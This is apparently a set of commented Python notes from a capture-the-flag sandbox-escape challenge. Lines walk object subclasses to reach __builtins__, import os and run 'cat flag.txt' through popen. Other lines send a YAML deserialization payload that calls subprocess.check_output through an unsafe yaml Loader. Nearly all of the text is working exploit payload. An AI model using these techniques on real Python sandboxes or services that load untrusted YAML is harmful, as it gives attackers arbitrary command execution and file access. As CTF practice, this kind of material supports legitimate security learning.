# print([(i, c) for i,c in enumerate((0).__class__.__base__.__subclasses__()) if hasattr(c.__init__, '__globals__')]) # look for <class 'warnings.catch_warnings'>
# print((1).__class__.__base__.__subclasses__()[148].__init__.__globals__['__builtins__']['__import__']('os').popen("cat flag.txt").read())
# des()().load('!!python/object/apply:subprocess.check_output [["cat", "flag.txt"]]', Loader=des()().Loader)


# [(i, c) for i,c in enumerate((0).__class__.__base__.__subclasses__()) if hasattr(c.__init__, '__globals__')]
# getattr(lambda:0, '__' + 'globals' + '__')
# print(des()()) -> <module 'yaml' from '/usr/local/lib/python3.10/site-packages/yaml/__init__.py'>
# print(des()().Loader) -> <class 'yaml.loader.Loader'>
# des()().load('!!python/object/apply:subprocess.check_output [["cat", "flag.txt"]]', Loader=des()().Loader)